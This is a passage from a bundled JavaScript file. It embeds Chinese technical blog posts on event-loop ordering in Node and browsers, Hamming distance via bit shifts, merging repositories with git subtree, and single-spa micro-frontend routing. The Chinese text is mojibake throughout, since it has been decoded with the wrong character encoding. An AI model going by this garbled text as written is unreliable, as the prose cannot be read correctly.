ˆä¸ºç©ºï¼Œä¼šç«‹åˆ»æ£€æŸ¥<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code>ï¼Œå½“å‘ç°é˜Ÿåˆ—å­˜åœ¨ä»»åŠ¡ï¼Œç«‹å³æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ¯•ï¼Œæ ˆä¸ºç©ºï¼Œç»§ç»­æ£€æµ‹...</p>\\n<h3 id=\\"guan-yu-nexttick-dui-lie\\">å…³äº<code>nextTické˜Ÿåˆ—</code></h3>\\n<p>åœ¨<code>node v11.0.0</code>ä¹‹å‰ï¼Œ<code>nextTick</code>ä¼šç­‰å¾…é˜Ÿåˆ—ä¸­ä»»åŠ¡å…¨éƒ¨å®Œæˆï¼Œé‡‡å–æ‰§è¡Œï¼Œ</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>process.nextTick(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">1</span>)\\n  setImmediate(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">2</span>)\\n  })\\n})\\n\\nsetImmediate(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">3</span>)\\n  process.nextTick(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">4</span>)\\n  })\\n})</code></pre></code></pre>\\n<p>åœ¨æ—§ç‰ˆ<code>node</code>ä¸­ï¼Œç»“æœæ˜¯<code>1324</code>ï¼Œè¿™æ˜¯å› ä¸ºå½“æ‰§è¡Œå®Œ<code>3</code>ï¼Œ<code>Immediateé˜Ÿåˆ—</code>è¿˜æœ‰ä»»åŠ¡ï¼Œå› æ­¤<code>nextTick</code>ä¼šç­‰å¾…ä»»åŠ¡å®Œæˆæ‰æ‰§è¡Œã€‚</p>\\n<p>è€Œåœ¨æ–°ç‰ˆ<code>node</code>ä¸­ï¼Œç»“æœæ˜¯<code>1342</code>ï¼Œå› ä¸º<code>nextTick</code>ä¸å¿…ç­‰å¾…æ‰€æœ‰ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œè€Œåªæ˜¯ç­‰å¾…å•ä¸ª<code>Immediate</code>æˆ–è€…<code>Timer</code>å®Œæˆï¼Œä¾¿ä¼šæ£€æŸ¥è§¦å‘ã€‚</p>\\n<blockquote>\\n<p>In order to better match browser behaviour, run nextTicks (and subsequently the microtask queue) after each individual Timer and Immediate, rather than after the whole list is processed. The current behaviour is somewhat of a performance micro-optimization and also partly dictated by how timer handles were implemented.</p>\\n</blockquote>\\n<p>æ¥è‡ªï¼š<a href=\\"https://github.com/nodejs/node/pull/22842#issue-215309787\\">https://github.com/nodejs/node/pull/22842#issue-215309787</a></p>\\n<h3 id=\\"guan-yu-settimeout\\">å…³äºsetTimeout</h3>\\n<p>å½“è°ƒç”¨å¤šä¸ª<code>setTimeout</code>åœ¨æ—¶é—´åˆ°è¾¾å¹¶ä¸”è¦å›åˆ°æ ˆæ‰§è¡Œçš„æ—¶å€™,å®ƒä»¬æ˜¯æ‰§è¡Œä¸€ä¸ªï¼Œæ¸…ç©ºæ ˆï¼Œå†æ‰§è¡Œä¸‹ä¸€ä¸ªï¼Œæ¯æ¬¡æ‰§è¡Œå®Œä¸€æ¬¡ï¼Œéƒ½ä¼šæ£€æŸ¥ä¸€æ¬¡<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code></p>\\n<p>ä¾‹å¦‚ï¼ˆæµ‹è¯•åœ¨æµè§ˆå™¨ä¸­ï¼‰ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n   <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">1</span>);\\n   setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">2</span>);\\n   });\\n });\\n\\nsetTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">3</span>);\\n  <span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">4</span>);\\n  });\\n});</code></pre></code></pre>\\n<p>è¿™é‡Œçš„æ‰§è¡Œé¡ºåºæ˜¯<code>1342</code>ï¼Œ<code>Promise</code>ä¼šåœ¨æ¯æ¬¡å•ä¸ª<code>setTimeout</code>æ‰§è¡Œåï¼Œæ£€æŸ¥<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code>ã€‚</p>\\n<h3 id=\\"guan-yu-setimmediate\\">å…³äº<code>setImmediate</code></h3>\\n<p>è§¦å‘é€Ÿåº¦åœ¨è¿™4ä¸ªä¸­æœ€æ…¢çš„ä¸€ä¸ªï¼ŒåŒæ ·è·Ÿ<code>setTimeout</code>åŠ å…¥é˜Ÿåˆ—ä¸­ç­‰å¾…è§¦å‘ï¼Œä»–ä»¬çš„è¡Œä¸ºæ¯”è¾ƒæ€ªå¼‚ï¼Œåœ¨æµè§ˆå™¨å’Œåœ¨<code>node</code>å„ä¸ç›¸åŒï¼Œæ¯”è¾ƒå°‘è”åˆä½¿ç”¨ã€‚</p>\\n","toc":[{"anchor":"chu-fa-su-du-pai-xu","level":3,"text":"è§¦å‘é€Ÿåº¦æ’åº"},{"anchor":"guan-yu-wei-ren-wu-dui-lie","level":3,"text":"å…³äº<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code>"},{"anchor":"guan-yu-nexttick-dui-lie","level":3,"text":"å…³äº<code>nextTické˜Ÿåˆ—</code>"},{"anchor":"guan-yu-settimeout","level":3,"text":"å…³äºsetTimeout"},{"anchor":"guan-yu-setimmediate","level":3,"text":"å…³äº<code>setImmediate</code>"}],"relatedTags":null,"created_at":"2018-12-29","timeArr":[2018,11,29,0,0,0,0],"title":"setTimeout&Promise&nextTick&setImmediateæ¯”è¾ƒ","uuid":"32f90eaf4808bb2b560d3a1c843cd785de0f72cc","summary":"<h4>è§¦å‘é€Ÿåº¦æ’åº</h4>\\n<p><code>nextTick</code> â†’ <code>Promise</code> â†’ <code>setTimeout</code> â†’ <code>setImmediate</code></p>\\n<h4>å…³äº<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code></h4>\\n<p>æ¯å½“JSæ‰§è¡Œæ ˆä¸ºç©ºï¼Œä¼šç«‹åˆ»æ£€æŸ¥<code>å¾®ä»»åŠ¡é˜Ÿåˆ—</code>ï¼Œå½“å‘ç°é˜Ÿåˆ—å­˜åœ¨ä»»åŠ¡ï¼Œç«‹å³æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ¯•ï¼Œæ ˆä¸ºç©ºï¼Œç»§ç»­æ£€æµ‹...</p>\\n<h4>å…³äº<code>nextTické˜Ÿåˆ—</code></h4>\\n<p>åœ¨...</p>","slug":"setTimeout-Promise-nextTick-setImmediate-bi-jiao","sha":"b589bdc846b64d945f730a0f8dd8320bf5473996"}')},637:function(n){n.exports=JSON.parse('{"content":"<p>é€šå¸¸æµ·æ˜è·ç¦»çš„è®¡ç®—ä½¿ç”¨ <code>^</code>ï¼Œå†è®¡ç®—1çš„æ¬¡æ•°</p>\\n<p>ä½†å¦‚æœé‡åˆ°å¤§é‡æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦è®¡ç®—ç›¸äº’çš„æµ·æ˜è·ç¦»ï¼Œè¿™ç§æ–¹æ³•å°±ä¸åˆé€‚äº†ï¼Œå› ä¸ºæ¯æ¬¡è®¡ç®—1çš„æ¬¡æ•°ç›¸å¯¹æ¶ˆè€—æ˜¯å·¨å¤§çš„</p>\\n<p>å¦ä¸€ç§è®¡ç®—æµ·æ˜è·ç¦»çš„æ–¹æ³•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n* <span class=\\"hljs-doctag\\">@param </span>nums {Array}\\n* <span class=\\"hljs-doctag\\">@returns <span class=\\"hljs-type\\">{number}</span></span>\\n*/</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcHam</span>(<span class=\\"hljs-params\\">nums</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> total=<span class=\\"hljs-number\\">0</span>,binCount\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;<span class=\\"hljs-number\\">32</span>;i++){\\n    binCount=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">0</span>;j&lt;nums.length;j++){\\n          binCount+=(nums[j] &gt;&gt; i) &amp; <span class=\\"hljs-number\\">1</span>\\n    }\\n    total+=binCount*(nums.length-binCount)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> total\\n}</code></pre></code></pre>\\n<p>è¿™é‡Œä¸»è¦æ˜¯ <code>&gt;&gt;</code> å’Œ <code>&amp;</code>ï¼Œå®ç°å¯¹æ¯ä¸€ä¸ªæ•°æ®è¿›è¡Œä½æ•°å¤„ç†</p>\\n<p>æ€è·¯æ˜¯ï¼š</p>\\n<p>1ã€å¯¹æ¯ä¸€ä¸ªæ•°æ®è¿›è¡Œå³ç§» iä½<code>nums[j] &gt;&gt; i</code> ï¼Œå¾—å‡º k</p>\\n<p>2ã€å¯¹ k è¿›è¡Œ <code>k &amp; 1</code>ï¼Œ 1 çš„äºŒè¿›åˆ¶æ˜¯<code>...00001</code>ï¼Œå› æ­¤å¯ä»¥åˆ¤æ–­å‡º k çš„æœ€å1ä½æ˜¯ 1 è¿˜æ˜¯ 0ï¼Œæ‰€ä»¥<code>binCount</code>å°±æ˜¯æœ€åä¸€ä½ä¸º1çš„æ•°é‡</p>\\n<p>3ã€<code>binCount*(nums.length-binCount)</code> ï¼Œå…¶ä¸­<code>nums.length-binCount</code>æŒ‡æœ€åä¸€ä½æ˜¯0çš„æ•°é‡ï¼Œå› æ­¤<code>1çš„æ•°é‡*0çš„æ•°é‡</code>ï¼Œä¹Ÿå°±æ˜¯å®ƒä»¬èƒ½ç»„åˆçš„æµ·æ˜è·ç¦»</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-23","timeArr":[2018,7,23,0,0,0,0],"title":"æ·±å…¥æµ·æ˜è·ç¦»","uuid":"a5bed495fbfaa670dcb632ac350bfa5c527e6eca","summary":"<p>é€šå¸¸æµ·æ˜è·ç¦»çš„è®¡ç®—ä½¿ç”¨ <code>^</code>ï¼Œå†è®¡ç®—1çš„æ¬¡æ•°</p>\\n<p>ä½†å¦‚æœé‡åˆ°å¤§é‡æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦è®¡ç®—ç›¸äº’çš„æµ·æ˜è·ç¦»ï¼Œè¿™ç§æ–¹æ³•å°±ä¸åˆé€‚äº†ï¼Œå› ä¸ºæ¯æ¬¡è®¡ç®—1çš„æ¬¡æ•°ç›¸å¯¹æ¶ˆè€—æ˜¯å·¨å¤§çš„</p>\\n<p>å¦ä¸€ç§è®¡ç®—æµ·æ˜è·ç¦»çš„æ–¹æ³•ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n* <span class=\\"hljs-doctag\\">@param </span>nums {Array}\\n* <span class=\\"hljs-doctag\\">@returns <span class=\\"hljs-type\\">{number}</span></span>\\n*/</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">cal</span>...</span></code></pre>","slug":"shen-ru-hai-ming-ju-li","sha":"4a3568d093ea0316f644a973e4b91143b8563bd4"}')},638:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"bu-zhou-jie-shi\\">æ­¥éª¤è§£é‡Š</h4>\\n<ol>\\n<li><p>åˆ›å»ºremoteè¿æ¥\\ngit remote add è‡ªå®šä¹‰è¿œç¨‹ä»“åº“å è¿œç¨‹ä»“åº“åœ°å€ è¿œç¨‹ä»“åº“åˆ†æ”¯</p>\\n</li>\\n<li><p>æ·»åŠ subtree \\ngit subtree add --prefix=å½“å‰ä»“åº“çš„å­ç›®å½•åç§°(å¯ä»¥ä½¿ç”¨/è¿›è¡Œåˆ†å‰²)  è¿œç¨‹ä»“åº“åœ°å€ è¿œç¨‹ä»“åº“åˆ†æ”¯ &lt;--squash&gt;æ·»åŠ squashåˆ™ä¸ä¿å­˜å­ç›®å½•çš„gitè®°å½•</p>\\n</li>\\n</ol>\\n<h4 id=\\"an-li\\">æ¡ˆä¾‹</h4>\\n<ul>\\n<li>å½“å‰ç›®å½•<code>e:/project/demo-list</code></li>\\n</ul>\\n<ul>\\n<li><p>è¿œç¨‹ç›®å½•1ï¼š<code>d:/demo1</code></p>\\n<p>  åˆ†æ”¯ï¼š<code>master</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>  demo1\\n    |â€”â€”1.txt\\n    |â€”â€”2.txt\\n    |â€”â€”3.txt</code></pre></code></pre></li>\\n<li><p>è¿œç¨‹ç›®å½•2ï¼š<code>d:/demo2</code></p>\\n<p>  åˆ†æ”¯ï¼š<code>dev</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>  demo2\\n    |â€”â€”1.png\\n    |â€”â€”2.png\\n    |â€”â€”3.png</code></pre></code></pre></li>\\n<li><p>é¢„æœŸç»“æœï¼Œä¿å­˜è¿œç¨‹ç›®å½•çš„gitè®°å½•</p>\\n<pre><code><pre class=\\"hljs\\"><code>  demo-list\\n    |â€”â€”src\\n      |â€”â€”demo1\\n        |â€”â€”1.txt\\n        |â€”â€”2.txt\\n        |â€”â€”3.txt\\n      |â€”â€”demo2\\n        |â€”â€”1.png\\n        |â€”â€”2.png\\n        |â€”â€”3.png</code></pre></code></pre></li>\\n<li><p>åˆå§‹åŒ–</p>\\n</li>\\n</ul>\\n<ol>\\n<li><code>cd demo-list</code></li>\\n<li><code>git init</code></li>\\n<li>æ·»åŠ <code>.gitignore</code>æˆ–è€…<code>readme.md</code>ï¼Œç„¶åcommitï¼Œpushè®©å½“å‰ç›®å½•æœ‰masteråˆ†æ”¯</li>\\n</ol>\\n<ul>\\n<li>ç¬¬ä¸€ä¸ªdemo</li>\\n</ul>\\n<ol>\\n<li><code>git remote add d1 d:/demo1 master</code></li>\\n<li><code>git subtree add --prefix=src/demo1  d:/demo1 master</code></li>\\n<li><code>git remote remove d1</code></li>\\n</ol>\\n<ul>\\n<li>ç¬¬äºŒä¸ªdemo</li>\\n</ul>\\n<ol>\\n<li><code>git remote add d2 d:/demo2 dev</code></li>\\n<li><code>git subtree add --prefix=src/demo2 d:/demo2 dev</code></li>\\n<li><code>git remote remove d2</code></li>\\n</ol>\\n","toc":[{"anchor":"bu-zhou-jie-shi","level":4,"text":"æ­¥éª¤è§£é‡Š"},{"anchor":"an-li","level":4,"text":"æ¡ˆä¾‹"}],"relatedTags":null,"created_at":"2018-10-15","timeArr":[2018,9,15,0,0,0,0],"title":"ä½¿ç”¨git-subtreeåˆå¹¶å¤šä¸ªä»“åº“å¹¶ä¿å­˜gitè®°å½•","uuid":"8f18e156230f2d648d08410062a8bf8183c0628e","summary":"<h4>æ­¥éª¤è§£é‡Šï¼š</h4>\\n<ol>\\n<li>\\n<p>åˆ›å»ºremoteè¿æ¥\\ngit remote add è‡ªå®šä¹‰è¿œç¨‹ä»“åº“å è¿œç¨‹ä»“åº“åœ°å€ è¿œç¨‹ä»“åº“åˆ†æ”¯</p>\\n</li>\\n<li>\\n<p>æ·»åŠ subtree\\ngit subtree add --prefix=å½“å‰ä»“åº“çš„å­ç›®å½•åç§°(å¯ä»¥ä½¿ç”¨/è¿›è¡Œåˆ†å‰²)  è¿œç¨‹ä»“åº“åœ°å€ è¿œç¨‹ä»“åº“åˆ†æ”¯ &lt;--squash&gt;æ·»åŠ squashåˆ™...</p>\\n</li>\\n</ol>","slug":"shi-yong-git-subtree-he-bing-duo-ge-cang-ku-bing-bao-cun-git-ji-lu","sha":"45b974064ac9411014a451c0abd392f2b223e760"}')},639:function(n){n.exports=JSON.parse('{"content":"<p><code>single-spa</code>ä¸€ä¸ªé¡µé¢è·¯ç”±ç®¡ç†å·¥å…·ï¼Œå½“ä¸€ä¸ªé¡µé¢å­˜åœ¨å¤šä¸ªæ¡†æ¶<code>React</code>, <code>Vue</code>, <code>Angular</code>ç­‰ç­‰æ—¶ï¼Œå•ä¸ªæ¡†æ¶è·¯ç”±å·²ç»ä¸èƒ½é€‚ç”¨ï¼Œéœ€è¦ä¸€ä¸ªçº¯ç²¹çš„<code>js</code>è·¯ç”±è¿›è¡Œç®¡ç†ã€‚</p>\\n<h4 id=\\"xiang-mu-jie-gou\\">é¡¹ç›®ç»“æ„</h4>\\n<pre><code><pre class=\\"hljs\\"><code>â”œâ”€â”€ index.js\\nâ”œâ”€â”€ react-blog\\n|  â”œâ”€â”€ ...other filesï¼ˆå†…éƒ¨è·¯ç”±ï¼‰\\n|  â””â”€â”€ index.js\\nâ””â”€â”€ vue-diy-resume\\n   â”œâ”€â”€ ...other filesï¼ˆå†…éƒ¨è·¯ç”±ï¼‰\\n   â””â”€â”€ index.js</code></pre></code></pre><p>å…¶ä¸­</p>\\n<ul>\\n<li><code>index.js</code>æ˜¯<code>single-spa</code>çš„å¯åŠ¨é¡µé¢ï¼Œä¹Ÿæ˜¯<code>webpack</code>çš„<code>entry</code>è·¯å¾„ã€‚</li>\\n<li><code>react-blog/index.js</code>æ˜¯<code>React</code>é¡¹ç›®çš„å¯åŠ¨é¡µ</li>\\n<li><code>vue-diy-resume/index.js</code>æ˜¯<code>Vue</code>é¡¹ç›®çš„å¯åŠ¨é¡µ</li>\\n</ul>\\n<p>éœ€è¦å¯¹åŸé¡¹ç›®çš„å¯åŠ¨é¡µåšå‡ºä¸€äº›ä¿®æ”¹ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒå®¹æ˜“çš„</p>\\n<blockquote>\\n<p>single-spaæ ¹æ®é¡¶çº§è·¯ç”±æŸ¥æ‰¾åº”ç”¨ï¼Œè€Œæ¯ä¸ªåº”ç”¨ä¼šå¤„ç†è‡ªèº«çš„å­è·¯ç”±</p>\\n</blockquote>\\n<p>å¯¹äºæ¯ä¸€ä¸ªå­åº”ç”¨ï¼Œéœ€è¦æš´éœ²å‡º3ä¸ª<code>Promise</code>ï¼Œåˆ†åˆ«æ˜¯<code>bootstrap</code>, <code>mount</code>, <code>unmount</code>ï¼Œ å¦å¤–è¿˜æœ‰ä¸€ä¸ª<code>unload</code> (ç§»é™¤) æ˜¯å¯é€‰çš„</p>\\n<ul>\\n<li><code>bootstrap</code>: <code>single-spa</code>çš„å­åº”ç”¨å¯åŠ¨åŠŸèƒ½</li>\\n<li><code>mount</code>ï¼šå½“å‰å­åº”ç”¨æŒ‚è½½åæ‰§è¡Œ(ç±»ä¼¼äºcomponentçš„ç”Ÿå‘½å‘¨æœŸ)</li>\\n<li><code>unmount</code>ï¼šå½“å‰å­åº”ç”¨å¸è½½åæ‰§è¡Œ</li>\\n</ul>\\n<p>å¯¹åº”æ¯ä¸ªå‰ç«¯æ¡†æ¶å·²ç»æœ‰ç°æˆçš„æ’ä»¶å¯ä»¥ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦å¤ªå¤šéœ€è¦åšçš„ï¼Œåªéœ€è¦å°†åº”ç”¨ä¼ é€’å³å¯</p>\\n<h4 id=\\"react\\">React</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// react-blog/index.js(ä½¿ç”¨ single-spa-react)</span>\\n\\n<span class=\\"hljs-keyword\\">import</span> React <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react\'</span>\\n<span class=\\"hljs-keyword\\">import</span> ReactDOM <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react-dom\'</span>\\n<span class=\\"hljs-keyword\\">import</span> App <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./App\'</span>\\n<span class=\\"hljs-keyword\\">import</span> singleSpaReact <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'single-spa-react\'</span>\\n\\n\\n<span class=\\"hljs-keyword\\">const</span> reactLifecycles = singleSpaReact({\\n  React,\\n  ReactDOM,\\n  <span class=\\"hljs-attr\\">rootComponent</span>: App,\\n  domElementGetter,\\n})\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">bootstrap</span>(<span class=\\"hljs-params\\">props</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> reactLifecycles.bootstrap(props)\\n}\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">mount</span>(<span class=\\"hljs-params\\">props</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> reactLifecycles.mount(props)\\n}\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">unmount</span>(<span class=\\"hljs-params\\">props</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> reactLifecycles.unmount(props)\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">domElementGetter</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-comment\\">// Make sure there is a div for us to render into</span>\\n  <span class=\\"hljs-keyword\\">let</span> el = <span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\'react-root\'</span>)\\n  <span class=\\"hljs-keyword\\">if</span> (!el) {\\n    el = <span class=\\"hljs-built_in\\">document</span>.createElement(<span class=\\"hljs-string\\">\'div\'</span>)\\n    el.id = <span class=\\"hljs-string\\">\'react-root\'</span>\\n    <span class=\\"hljs-built_in\\">document</span>.body.appendChild(el)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> el\\n}\\n</code></pre></code></pre>\\n<h4 id=\\"vue\\">Vue</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// vue-diy-resume/index.js</span>\\n\\n<span class=\\"hljs-keyword\\">import</span> vuetify <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./vuetify\'</span>\\n<span class=\\"hljs-keyword\\">import</span> Vue <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'vue\'</span>\\n<span class=\\"hljs-keyword\\">import</span> Main <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./Main\'</span>\\n<span class=\\"hljs-keyword\\">import</span> routes <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./router\'</span>\\n<span class=\\"hljs-keyword\\">import</span> singleSpaVue <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'single-spa-vue\'</span>\\n\\n\\nVue.use(...)\\nVue.use(...)\\n\\n<span class=\\"hljs-keyword\\">const</span> vueLifecycles = singleSpaVue({\\n    Vue,\\n    <span class=\\"hljs-attr\\">appOptions</span>: {\\n        <span class=\\"hljs-attr\\">vuetify</span>:vuetify,\\n        router,\\n        <span class=\\"hljs-attr\\">el</span>: <span class=\\"hljs-string\\">\'#vue-root\'</span>,\\n        <span class=\\"hljs-attr\\">render</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">h</span> =&gt;</span> h(Main)\\n    }\\n})\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> bootstrap = [\\n    vueLifecycles.bootstrap,\\n]\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> mount = [\\n    vueLifecycles.mount,\\n]\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> unmount = [\\n    vueLifecycles.unmount,\\n]\\n</code></pre></code></pre>\\n<p>å­åº”ç”¨çš„å¯åŠ¨é¡µå†™å¥½äº†ï¼Œå°±æ˜¯ä¸»é¡µé¢æ±‡æ€»ï¼Œå®šä¹‰è·¯ç”±ï¼Œå®šä¹‰å½“å‰è·¯ç”±çš„æ¿€æ´»å‡½æ•°(åˆ¤æ–­å½“å‰è·¯å¾„<code>window.location</code>æ˜¯å¦å¯ä»¥è¿›å…¥å­åº”ç”¨)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// index.js</span>\\n\\n<span class=\\"hljs-keyword\\">import</span> * <span class=\\"hljs-keyword\\">as</span> singleSpa <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'single-spa\'</span>\\n\\nsingleSpa.registerApplication(<span class=\\"hljs-string\\">\'blog\'</span>, () =&gt; <span class=\\"hljs-keyword\\">import</span> (<span class=\\"hljs-string\\">\'./react-blog/index\'</span>), blogPathPrefix(<span class=\\"hljs-string\\">\'/\'</span>))\\nsingleSpa.registerApplication(<span class=\\"hljs-string\\">\'diy-resume\'</span>, ()=&gt;<span class=\\"hljs-keyword\\">import</span> (<span class=\\"hljs-string\\">\'./vue-diy-resume/index\'</span>), projectPathPrefix(<span class=\\"hljs-string\\">\'/diy-resume\'</span>))\\n\\nsingleSpa.start()\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">blogPathPrefix</span>(<span class=\\"hljs-params\\">prefix</span>) </span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">location</span>) </span>{\\n        <span class=\\"hljs-keyword\\">if</span>(location.pathname.startsWith(<span class=\\"hljs-string\\">\'/diy-resume\'</span>))<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span>\\n        <span class=\\"hljs-keyword\\">return</span> location.pathname.startsWith(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${prefix}</span>`</span>)\\n    }\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">projectPathPrefix</span>(<span class=\\"hljs-params\\">prefix</span>) </span>{\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">location</span>) </span>{\\n        <span class=\\"hljs-keyword\\">return</span> location.pathname.startsWith(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${prefix}</span>`</span>)\\n    }\\n}\\n</code></pre></code></pre>\\n<p>ç°åœ¨åº”ç”¨å·²ç»è¯†åˆ«<code>single-spa</code>è·¯ç”±ç³»ç»Ÿï¼Œå¦‚ä½•åœ¨åº”ç”¨å†…éƒ¨è·³è½¬åˆ°å¦ä¸€ä¸ªåº”ç”¨ï¼Ÿ</p>\\n<p><code>single-spa</code>æä¾›ä¸€ä¸ªå…¨å±€å‡½æ•°<code>window.singleSpaNavigate</code>ï¼Œæ¥æ”¶å‚æ•°ä¸ºè·¯ç”±è·¯å¾„</p>\\n","toc":[{"anchor":"xiang-mu-jie-gou","level":4,"text":"é¡¹ç›®ç»“æ„"},{"anchor":"react","level":4,"text":"React"},{"anchor":"vue","level":4,"text":"Vue"}],"relatedTags":null,"created_at":"2021-06-07","timeArr":[2021,5,7,0,0,0,0],"title":"single-spa-å¾®å‰ç«¯çš„è·¯ç”±ç®¡ç†ç³»ç»Ÿ","uuid":"386fc98fbb6d77826458755f0e09b60919b215bc","summary":"<p><code>single-spa</code>ä¸€ä¸ªé¡µé¢è·¯ç”±ç®¡ç†å·¥å…·ï¼Œå½“ä¸€ä¸ªé¡µé¢å­˜åœ¨å¤šä¸ªæ¡†æ¶<code>React</code>, <code>Vue</code>, <code>Angular</code>ç­‰ç­‰æ—¶ï¼Œå•ä¸ªæ¡†æ¶è·¯ç”±å·²ç»ä¸èƒ½é€‚ç”¨ï¼Œéœ€è¦ä¸€ä¸ªçº¯ç²¹çš„<code>js</code>è·¯ç”±è¿›è¡Œç®¡ç†ã€‚</p>\\n<h4>é¡¹ç›®ç»“æ„ï¼š</h4>\\n<pre class=\\"hljs\\"><code>â”œâ”€â”€ index.js\\nâ”œâ”€â”€ react-blog\\n|  â”œâ”€â”€ ...other files...</code></pre>","slug":"single-spa-wei-qian-duan-de-lu-you-guan-li-xi-tong","sha":"68aa212db545b2cf71c29d34fbbce9f30fe3e228"}')},640:function(n){n.exports=JSON.parse('{"content":"<p>æ€è·¯ï¼šåˆ©ç”¨å¯¹ç§°æ€æƒ³</p>\\n<ol>\\n<li><p>å…ˆå°†åŸå­—ç¬¦ä¸²è½¬æ¢æˆè½¬æ¢æˆ <code>#x$x$x$</code> 